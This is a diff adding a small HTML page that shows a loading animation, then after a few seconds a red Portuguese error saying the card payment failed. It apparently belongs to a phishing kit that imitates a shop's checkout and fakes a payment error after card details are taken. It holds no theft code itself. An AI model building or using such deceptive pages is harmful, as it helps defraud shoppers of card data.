@@ -1,0 +1,43 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> 
+    <title>loading</title>
+    <style>
+        body {
+            background-color: #FFFFFF;
+        }
+        img {
+            position: absolute;top: 50%;left: 50%;margin-right: -50%;transform: translate(-50%, -50%) 
+        }
+        #errbox{
+          display: block;
+          border: 1px solid red;
+          padding: 8px;
+          background-color: red;
+         }
+
+        .err-msg{
+          color: #FFF;
+        }
+    </style>
+    <script>
+      window.onload=function(){
+        window.setInterval(function(){
+            var popup = document.getElementById('errbox');
+            popup.style.display = 'block'
+        },5500);
+      }
+    </script>
+  </head>
+  <body>
+    <div id="errbox" style="display:none;"> 
+      <span class="err-msg">
+        Erro ao processar o pagamento! Verifique se seu cartão está autorizado para comprar online e tente novamente em alguns minutos.
+      </span>
+    </div>
+    <img src="assets/loading-4x-gray-_CB485916919_.gif">
+  </body>
+</html>
